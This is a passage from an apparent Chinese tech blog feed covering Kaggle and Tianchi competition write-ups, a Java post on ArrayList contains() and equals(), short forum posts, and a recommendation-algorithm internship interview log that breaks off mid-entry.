的差值</strong></li><li>用户之前查看题目解答的次数</li><li>用户之前答题正确查看题目解答的次数</li><li>用户听力测试题目和阅读测试题目答题次数，回答正确的次数，答题正确率</li><li>用户听讲座的次数</li></ul></li><li><p>用户和题目 part 组合特征</p><ul><li>用户对同类型的题目回答次数，回答正确次数，正确率</li><li><em>用户距离上次同类型的题目回答正确和回答错误的时间差</em></li></ul></li><li><p>用户和题目 tag1 组合特征</p><ul><li>用户对同标签的题目回答次数，回答正确次数，正确率</li></ul></li><li><p>用户和题目组合</p><ul><li><strong>用户之前是否回答过这道题</strong></li><li><strong><em>用户距离上次回答该问题的时间差</em></strong></li></ul></li></ul><h3 id="关于-task-container-id-的强特"><a href="#关于-task-container-id-的强特" class="headerlink" title="关于 task_container_id 的强特"></a>关于 task_container_id 的强特</h3><p>Kaggle 上关于 task_container_id 的讨论不少，<a href="https://www.kaggle.com/c/riiid-test-answer-prediction/discussion/189465" target="_blank" rel="noopener">这则帖子</a>指出了 timestamp 和 task_container_id 不连续的问题，如图1所示。  </p><p><img src="https://pic.logicjake.xyz/kaggle_riiid_1.png" alt="图1">  </p><p>根据 Kaggle 工作人员在其他 discussion 里的答疑，timestamp 代表的是用户结束回答题目的时间。task_container_id 来源于这样一个场景：用户每次做题会得到一批题目，task_container_id 代表的是这批题目的编号，编号从0开始自增，所以 task_container_id 的大小反应了用户开始做题的顺序。如果用户都是做完一批题目再做下一批题目，那么 task_container_id 应该是随着 timestamp 依次增大的。图2代表的就是做完一批题目再做下一批题目的场景（方框中编号代表 task_container_id）。  </p><p><img src="https://pic.logicjake.xyz/kaggle_riiid_2.png" alt="图2">  </p><p>但是在上学的时候，老师应该教过我们：遇到不会的题目先跳过，过一会再做。task_container_id 不连续的原因就在于此，以图3为例，用户做到 task_container_id 为1的题目时发现题目不会做，所以先行跳过做 task_container_id 为2的题目。task_container_id 为2的题目比较简单，做完之后再返回去攻克 task_container_id 为1的题目。这就导致了 task_container_id 不随着 timestamp 自增的现象。根据这个现象我们可以构造一个强特：当前题目所属 task_container_id 和之前一批题目的 task_container_id 的差值，差值的绝对值越大，代表回答这次题目时跳过的越多。<strong>这个特征提升约1.5k</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 求和上批题目 task_container_id 的差值</span><br><span class="line">utci[cnt] &#x3D; task_container_id - u_task_container_id_dict[user_id]</span><br><span class="line"></span><br><span class="line"># 更新最新批题目的 task_container_id </span><br><span class="line">if task_container_id !&#x3D; u_task_container_id_dict[user_id]:</span><br><span class="line">    u_task_container_id_dict[user_id] &#x3D; task_container_id</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://pic.logicjake.xyz/kaggle_riiid_3.png" alt="图3" title="">                </div>                <div class="image-caption">图3</div>            </figure><h3 id="用户和题目组合特征"><a href="#用户和题目组合特征" class="headerlink" title="用户和题目组合特征"></a>用户和题目组合特征</h3><p>用户和题目的交叉特征非常有用，但受限于二者交叉之后巨大维度带来的内存问题，只构造了2个特征，且都需要特殊的数据结构减少内存占用。</p><p><a href="https://www.kaggle.com/c/riiid-test-answer-prediction/discussion/194266" target="_blank" rel="noopener">这则帖子</a>发现用户会重复回答某些问题，所以可以构造特征：用户第几次回答这个问题。如果采用之前的字典方式，user_id 和 content_id 交互后 key 的数量十分巨大，十分占内存。经原贴评论区大佬指导，可以采用 bitarray 这个数据结构退而求其次记录用户之前是否做过这个题目。每个用户维护长度为14000的 bitarray，content_id 因为已经是从0开始的连续值，所以可以用下标查询的方式确定 bitarry 对应位置是否为1。<strong>该特征提升幅度4个k。</strong></p><p>之前也说过时间差是个很重要的特征，所以继续构造用户距离上次回答该问题的时间差，如果时间差比较短，那么用户可能记忆比较深刻，做错的概率也较小。构造这个特征就没办法使用 bitarray 了，还是得延续之前的字典做法。之前字典爆内存的原因在于 key 过多，所以我们采用 LRU 缓存的方式，只维护指定长度的字典，一旦新加入记录时字典满了，直接删除最近最少使用的记录。python 的数据结构 OrderedDict 有个特性，他会按照 key 加入的顺序排序。所以我们每次查询一条记录，如果该记录存在，则把他从 OrderedDict 中删除，再重新添加到 OrderedDict 中去，这样 OrderedDict 的末尾保存的就是最近使用的记录。同样当字典满了，直接删除第一条记录，就可以起到删除最近最少使用的记录的作用。<strong>该特征提升幅度2个k。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class LRUCache(OrderedDict):</span><br><span class="line">    def __init__(self, capacity&#x3D;100):</span><br><span class="line">        self.capacity &#x3D; capacity</span><br><span class="line">        self.cache &#x3D; OrderedDict()</span><br><span class="line"></span><br><span class="line">    def get(self, key):</span><br><span class="line">        if key in self.cache:</span><br><span class="line">            value &#x3D; self.cache.pop(key)</span><br><span class="line">            self.cache[key] &#x3D; value</span><br><span class="line">        else:</span><br><span class="line">            value &#x3D; -1</span><br><span class="line"></span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">    def set(self, key, value):</span><br><span class="line">        if key in self.cache:</span><br><span class="line">            value &#x3D; self.cache.pop(key)</span><br><span class="line">            self.cache[key] &#x3D; value</span><br><span class="line">        else:</span><br><span class="line">            if len(self.cache) &#x3D;&#x3D; self.capacity:</span><br><span class="line">                self.cache.popitem(last&#x3D;False)</span><br><span class="line">                self.cache[key] &#x3D; value</span><br><span class="line">            else:</span><br><span class="line">                self.cache[key] &#x3D; value</span><br></pre></td></tr></table></figure><h1 id="模型融合"><a href="#模型融合" class="headerlink" title="模型融合"></a>模型融合</h1><p>最终模型选用 LGB 融合<a href="https://www.kaggle.com/gilfernandes/riiid-self-attention-transformer" target="_blank" rel="noopener">开源</a>的0.77的 transformer 模型，0.75 * LGB 预测概率 + 0.25 * NN 预测概率，融合大概能带来3k的提升。</p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/01/08/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E9%87%91%E8%9E%8D%E9%A3%8E%E6%8E%A7-%E8%B4%B7%E6%AC%BE%E8%BF%9D%E7%BA%A6%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[零基础入门金融风控-贷款违约预测-赛后总结]]></title>
        <updated>2021-04-25T11:57:33+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/01/08/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E9%87%91%E8%9E%8D%E9%A3%8E%E6%8E%A7-%E8%B4%B7%E6%AC%BE%E8%BF%9D%E7%BA%A6%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2021/01/08/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E9%87%91%E8%9E%8D%E9%A3%8E%E6%8E%A7-%E8%B4%B7%E6%AC%BE%E8%BF%9D%E7%BA%A6%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：11 / 4780<br>比赛地址：<a href="https://tianchi.aliyun.com/competition/entrance/531830/introduction" target="_blank" rel="noopener">https://tianchi.aliyun.com/competition/entrance/531830/introduction</a><br>开源地址：<a href="https://github.com/LogicJake/tianchi-loan-default-prediction-top11" target="_blank" rel="noopener">https://github.com/LogicJake/tianchi-loan-default-prediction-top11</a></p><p>这个比赛属于天池办的一系列入门赛的其一，没奖金只有一些小奖品，所以竞争很小。总的来说该方案没有什么耀眼的操作，就是简单的数据处理，暴力特征工程和模型融合，单纯看好久没更博文了，发上来凑个数。</p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>赛题以金融风控中的个人信贷为背景，要求选手根据贷款申请人的数据信息预测其是否有违约的可能，以此判断是否通过此项贷款，这是一个典型的分类问题。</p><h1 id="数据介绍"><a href="#数据介绍" class="headerlink" title="数据介绍"></a>数据介绍</h1><p>赛题以预测用户贷款是否违约为任务，数据集报名后可见并可下载，该数据来自某信贷平台的贷款记录，总数据量超过120w，包含47列变量信息，其中15列为匿名变量。为了保证比赛的公平性，将会从中抽取80万条作为训练集，20万条作为测试集A，20万条作为测试集B，同时会对employmentTitle、purpose、postCode和title等信息进行脱敏。  </p><table><thead><tr><th align="center">Field</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">id</td><td align="center">为贷款清单分配的唯一信用证标识</td></tr><tr><td align="center">loanAmnt</td><td align="center">贷款金额</td></tr><tr><td align="center">term</td><td align="center">贷款期限（year）</td></tr><tr><td align="center">interestRate</td><td align="center">贷款利率</td></tr><tr><td align="center">installment</td><td align="center">分期付款金额</td></tr><tr><td align="center">grade</td><td align="center">贷款等级</td></tr><tr><td align="center">subGrade</td><td align="center">贷款等级之子级</td></tr><tr><td align="center">employmentTitle</td><td align="center">就业职称</td></tr><tr><td align="center">employmentLength</td><td align="center">就业年限（年）</td></tr><tr><td align="center">homeOwnership</td><td align="center">借款人在登记时提供的房屋所有权状况</td></tr><tr><td align="center">annualIncome</td><td align="center">年收入</td></tr><tr><td align="center">verificationStatus</td><td align="center">验证状态</td></tr><tr><td align="center">issueDate</td><td align="center">贷款发放的月份</td></tr><tr><td align="center">purpose</td><td align="center">借款人在贷款申请时的贷款用途类别</td></tr><tr><td align="center">postCode</td><td align="center">借款人在贷款申请中提供的邮政编码的前3位数字</td></tr><tr><td align="center">regionCode</td><td align="center">地区编码</td></tr><tr><td align="center">dti</td><td align="center">债务收入比</td></tr><tr><td align="center">delinquency_2years</td><td align="center">借款人过去2年信用档案中逾期30天以上的违约事件数</td></tr><tr><td align="center">ficoRangeLow</td><td align="center">借款人在贷款发放时的fico所属的下限范围</td></tr><tr><td align="center">ficoRangeHigh</td><td align="center">借款人在贷款发放时的fico所属的上限范围</td></tr><tr><td align="center">openAcc</td><td align="center">借款人信用档案中未结信用额度的数量</td></tr><tr><td align="center">pubRec</td><td align="center">贬损公共记录的数量</td></tr><tr><td align="center">pubRecBankruptcies</td><td align="center">公开记录清除的数量</td></tr><tr><td align="center">revolBal</td><td align="center">信贷周转余额合计</td></tr><tr><td align="center">revolUtil</td><td align="center">循环额度利用率，或借款人使用的相对于所有可用循环信贷的信贷金额</td></tr><tr><td align="center">totalAcc</td><td align="center">借款人信用档案中当前的信用额度总数</td></tr><tr><td align="center">initialListStatus</td><td align="center">贷款的初始列表状态</td></tr><tr><td align="center">applicationType</td><td align="center">表明贷款是个人申请还是与两个共同借款人的联合申请</td></tr><tr><td align="center">earliesCreditLine</td><td align="center">借款人最早报告的信用额度开立的月份</td></tr><tr><td align="center">title</td><td align="center">借款人提供的贷款名称</td></tr><tr><td align="center">policyCode</td><td align="center">公开可用的策略_代码=1新产品不公开可用的策略_代码=2</td></tr><tr><td align="center">n系列匿名特征</td><td align="center">匿名特征n0-n14，为一些贷款人行为计数特征的处理</td></tr></tbody></table><p>提交结果为每个测试样本是1的概率，也就是y为1的概率。评价方法为AUC评估模型效果。</p><h1 id="方案总结"><a href="#方案总结" class="headerlink" title="方案总结"></a>方案总结</h1><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>原数据中有贷款等级和贷款等级之子级两个类别特征，但因为有明显的大小关系，所以需要将其映射为数值。贷款等级范围为“A-G”，将其映射为“1-7”。子级在每个等级上又细分了5个数字等级，所以用“等级×5+细分等级”映射。</p><p>就业年限（年）特征也是具有明显大小关系的类别特征。首先将“10+ years”替换成“10 years”，“&lt; 1 year”替换成“0 years”。随后提取数字年份为新特征。</p><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><h3 id="业务特征"><a href="#业务特征" class="headerlink" title="业务特征"></a>业务特征</h3><p>业务特征就做了两个没细挖。用贷款发放的年份减去借款人最早报告的信用额度开立的年份可以大致得到借款人的年龄（？）。贷款金额除以贷款期限（year）可以得到每年的负债，再除以年收入可以得到年负债比。</p><h3 id="暴力特征"><a href="#暴力特征" class="headerlink" title="暴力特征"></a>暴力特征</h3><p>暴力特征主要围绕类别特征展开，对类别特征进行批量无筛选式的特征构造。主要进行了一阶和二阶组合下的 count 运算。</p><p>也对数值特征进行了二阶相加构造，但对模型没有提升就删去了。</p><h3 id="欺诈率"><a href="#欺诈率" class="headerlink" title="欺诈率"></a>欺诈率</h3><p>类比点击率特征，针对是否会欺诈的01标签，同样也可以利用五折交叉统计计算欺诈率特征。欺诈率以类别为单位统计，所以同样可以对类别特征进行一阶和二阶下的暴力构造。</p><h2 id="模型融合"><a href="#模型融合" class="headerlink" title="模型融合"></a>模型融合</h2><p>模型融合采用树模型三兄弟：LightGBM，Xgboost和Catboost。融合方式采用指数加权融合，三个模型的权重都是0.5。</p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/616</id>
        <title><![CDATA[Up！ Up！ Up！]]></title>
        <updated>2021-04-13T03:49:27+08:00</updated>
        <link href="https://www.suruifu.com/posts/616"/>
        <content type="text/html" src="https://www.suruifu.com/posts/616"><![CDATA[<p>青春是最宝贵的，努力，努力，努力！</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2021/04/11/blog13/</id>
        <title><![CDATA[Java 集合类的 contains 方法与 equals 方法的关系分析]]></title>
        <updated>2021-04-12T03:03:37+08:00</updated>
        <link href="http://www.windboy.top/2021/04/11/blog13/"/>
        <content type="text/html" src="http://www.windboy.top/2021/04/11/blog13/"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我在学习 ArrayList 类主要方法时，写过一段关于 contains() 的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">List&lt;Integer&gt; l1 = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">List&lt;Integer&gt; l2 = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">l1.add(<span class="number">1</span>);</span><br><span class="line">l1.add(<span class="number">2</span>);</span><br><span class="line">l2.add(<span class="number">1</span>);</span><br><span class="line">l2.add(<span class="number">2</span>);</span><br><span class="line">System.out.println(l1.hashCode());</span><br><span class="line">System.out.println(l2.hashCode());</span><br><span class="line">System.out.println(l1 == l2);</span><br><span class="line">System.out.println(l1.equals(l2));</span><br><span class="line">list.add(l1);</span><br><span class="line">System.out.println(list.contains(l2));  <span class="comment">//&lt;-在这里</span></span><br></pre></td></tr></table></figure><p>and 输出结果为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">994</span></span><br><span class="line"><span class="number">994</span></span><br><span class="line"><span class="keyword">false</span></span><br><span class="line"><span class="keyword">true</span>  <span class="comment">//equals() 的结果</span></span><br><span class="line"><span class="keyword">true</span>  <span class="comment">//contains() 的结果</span></span><br></pre></td></tr></table></figure><p>注意这里判断的是 list.contains(l2)，而 list 内只添加过 l1，结果却是存在！</p><h2 id="contains-源码分析"><a href="#contains-源码分析" class="headerlink" title="contains() 源码分析"></a>contains() 源码分析</h2><p>在 ArrayList 类中，contains() 调用了 indexOf() 进行判断是否包含：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> indexOf(o) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">              <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">              <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，indexOf() 中通过 equals() 比较 elementData[i]，返回一个 index。</p><p>elementData 在 ArrayList 类的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> Object[] elementData;</span><br></pre></td></tr></table></figure><p>逻辑简单，综合上面输出结果可以看到，equals() 和 contains() 的结果都为 true，而 == 的结果为 false。</p><p>复习一下 == 和 equals() 的比较。</p><h2 id="和-equals-的比较"><a href="#和-equals-的比较" class="headerlink" title="== 和 equals() 的比较"></a>== 和 equals() 的比较</h2><p><strong>==</strong></p><ul><li><p>基本数据类型 == 比较的是值。</p></li><li><p>引用数据类型 == 判断两个变量是否引用同一个对象。</p></li></ul><p><strong>equals()</strong></p><p>equals() 判断引用的对象是否等价。equals 方法不能作用于基本数据类型的变量。</p><p>类没有重写 equals() 方法，则通过 equals() 比较该类的两个对象时，等价于通过 == 比较这两个对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">this</span> == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般，我们都重写 equals() 来比较两个对象的内容是否相等。</p><p><strong>equals() 的重写方法</strong></p><ol><li><p>检查是否为同一个对象的引用，如果是直接返回 true。</p></li><li><p>检查是否是同一个类型，如果不是，直接返回 false。</p></li><li><p>将 Object 对象进行转型。</p></li><li><p>判断每个关键域是否相等。</p></li></ol><h2 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h2><p>回到 contains() 源码中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o.equals(elementData[i])</span><br></pre></td></tr></table></figure><p>o 为 Object 类，且 ArrayList 类没有重写 equals()，那么<u><strong>只在 contains() 这一步，是无法使 l1.equals(l2) 为 true 的。</strong></u></p><p>因此我们向上找原因所在，通过 debug 模式进入 equals() 中：</p><img src="/images/blog13/test.png" width="80%"/><p>然后进入了 AbstractList 类，这个类就是 ArrayList 类继承来的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">RandomAccess</span>, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br></pre></td></tr></table></figure><p>并且在 AbstractList 类中，我们发现重写了 equals()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> List))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    ListIterator&lt;E&gt; e1 = listIterator();</span><br><span class="line">    ListIterator&lt;?&gt; e2 = ((List&lt;?&gt;) o).listIterator();</span><br><span class="line">    <span class="keyword">while</span> (e1.hasNext() &amp;&amp; e2.hasNext()) &#123;</span><br><span class="line">        E o1 = e1.next();</span><br><span class="line">        Object o2 = e2.next();</span><br><span class="line">        <span class="keyword">if</span> (!(o1==<span class="keyword">null</span> ? o2==<span class="keyword">null</span> : o1.equals(o2)))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !(e1.hasNext() || e2.hasNext());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且 AbstractList 类重写了 hashCode()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashCode = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (E e : <span class="keyword">this</span>)</span><br><span class="line">        hashCode = <span class="number">31</span>*hashCode + (e==<span class="keyword">null</span> ? <span class="number">0</span> : e.hashCode());</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充一个考点，为什么重写 equals() 为什么要一定要重写 hashCode()？</p><h2 id="为什么重写-equals-为什么要一定要重写-hashCode-？"><a href="#为什么重写-equals-为什么要一定要重写-hashCode-？" class="headerlink" title="为什么重写 equals() 为什么要一定要重写 hashCode()？"></a>为什么重写 equals() 为什么要一定要重写 hashCode()？</h2><ul><li>等价的两个对象哈希值一定相同，哈希值相同的两个对象不一定等价。因为计算哈希值具有随机性，两个值不同的对象可能计算出相同的哈希值。</li><li>如果没有重写 hashCode()，两个对象 hashCode() 得出来的值不同，等价对象无法 equals()。</li><li>因此为了能 equals()，必须重写 hashCode()，保证等价的两个对象哈希值也相等。</li><li>主要是针对 HashSet 和 HashMap 等集合类，如果没有重写 hashCode()，则会导致集合中有两个等价的对象。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>梳理一下 contains() 与 equals() 的关系：</p><ol><li>ArrayList 类继承了 AbstractList 类对 equals() 和 hashCode() 的重写，使 l1.equals(l2) 的结果为 true，因为比较的是两个 list 内存的元素的值。</li><li>ArrayList 类的 contains() 调用了 indexOf()，indexOf() 使用 equals() 进行元素的比较，因此 list.contains(l2) 的结果也为 true。</li></ol>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/17-/1</id>
        <title><![CDATA[食堂吃饭有感]]></title>
        <updated>2021-04-07T04:10:34+08:00</updated>
        <link href="https://bbs.a2os.club/d/17-/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/17-/1"><![CDATA[<p>还是南航的食堂好啊，吃得香，便宜。<br>
现在在外面，一顿抵得上以前两顿</p>]]></content>
        <author>
            <name><![CDATA[A2OS 开源社区论坛]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/16-cloudflare-workers-cloudflare-pages/1</id>
        <title><![CDATA[博客迁移记 · 从 Cloudflare Workers 到 Cloudflare Pages]]></title>
        <updated>2021-04-06T11:54:13+08:00</updated>
        <link href="https://bbs.a2os.club/d/16-cloudflare-workers-cloudflare-pages/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/16-cloudflare-workers-cloudflare-pages/1"><![CDATA[<p><a href="https://blog.triplez.cn/posts/cf-workers-to-pages/" rel=" nofollow ugc">https://blog.triplez.cn/posts/cf-workers-to-pages/</a></p>

<p>借用 BBS 当个谈笑风生区~</p>]]></content>
        <author>
            <name><![CDATA[A2OS 开源社区论坛]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/14-/1</id>
        <title><![CDATA[推荐广告算法方向实习面经]]></title>
        <updated>2021-04-06T08:14:10+08:00</updated>
        <link href="https://bbs.a2os.club/d/14-/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/14-/1"><![CDATA[<h1>卡牛科技</h1>
<p>面试流程非常快，基本一天一个流程。面试官和 HR 也很好，主要围绕项目做一些扩展。公司主要算法业务为广告推荐，最近新引入了电商，做商品推荐。实习生可以住公司统一安排的二人间公寓。</p>

<h2>一面</h2>
<ol style="list-style-type:decimal"><li>介绍比赛项目，前排用的什么方案</li>
<li>机器学习方法和深度学习方法的应用场景</li>
<li>为什么使用 lightgbm 模型，优缺点</li>
<li>简述 word2vec 的技巧</li>
<li>transformer在序列模型中大放异彩，你认为他和传统的rnn模型相比强在哪里？</li>
<li>工程实践问题，项目中类别分布不平衡怎么办，负样本多怎么办</li>
<li>如果使用了下采样破坏了真实分布，如何在上线之后将预测的概率拉回真实的分布</li></ol>

<h2>二面</h2>
<ol style="list-style-type:decimal"><li>介绍比赛流程</li>
<li>对冷门商品的解决方法</li>
<li>如何保证召回的多样性</li>
<li>如何推荐新上架商品</li>
<li>模型推荐购买过的商品怎么处理</li>
<li>lightgbm 与 xgboost 区别</li>
<li>广告反欺诈中如果给 GPS 信息怎么处理</li></ol>

<h1>蚂蚁金服—支付宝—广告算法</h1>
<p>阿里好多部门在过完年之后就开始在各大群里发 jd，声势十分浩大。群里有人发了支付宝部门的 jd，说是有学长直推，而且方向和我很匹配，就去联系了一下学长，学长很 nice，帮我改简历，提了很多建议。阿里支持预先面，也是我第一次大厂面试，总共两轮技术面，本来有的交叉面被取消了。</p>

<h2>一面</h2>
<ol style="list-style-type:decimal"><li>映象比较深刻的比赛</li>
<li>在 kdd cup 竞赛中负责内容</li>
<li>介绍改进的itemcf</li>
<li>用户 embedding 和商品 embedding 不在一个特征空间，怎么计算相似性</li>
<li>有没有考虑把用户和商品的关系建为异构图</li>
<li>后处理如何打压热门商品</li>
<li>介绍 kdd cup 第一名的方案</li>
<li>介绍竞赛广告反欺诈的比赛</li></ol>
   <br>
<h2>二面</h2>
<p>二面应该是个领导，约的会议室快到时间了，所以问的比较简单，了解了一下竞赛项目和到岗时间就没了。</p>

<h1>字节跳动—商业变现—广告算法</h1>
<p>本来想把字节放在后面投的，所以只在系统里填了简历，没有投岗位，但 HR 加微信问我要不要试试他们部门，所以就阴差阳错开始了，总共三轮技术面。</p>
<h2>一面</h2>
<p>算法题：leetcode 排序矩阵查找，leetcode 102 二叉树的层序遍历</p>
<ol style="list-style-type:decimal"><li>介绍一个你认为做的最好的比赛</li>
<li>ANN用的什么工具，介绍一下原理</li>
<li>为什么选择Annoy</li>
<li>还知道其他ANN算法吗？介绍了一下局部敏感hash</li>
<li>做用户商品交互特征的时候，你知道业界是怎么做的？扯了一下DIN模型的和目标商品的attention做法</li>
<li>lightgbm和xgboost的区别</li>
<li>排序阶段你知道业界是怎么做的？说了一下点击率模型：deepfm，nfm，wide &amp; deep，dcn，deepcrossing</li>
<li>介绍一下word2vec</li>
<li>介绍一下transformer</li>
<li>bert的两种预训练方式</li>
<li>为什么要用mask？说了padding mask和sequence mask</li>
<li>为什么要sequence mask？防止信息穿越</li></ol>

<h2>二面</h2>
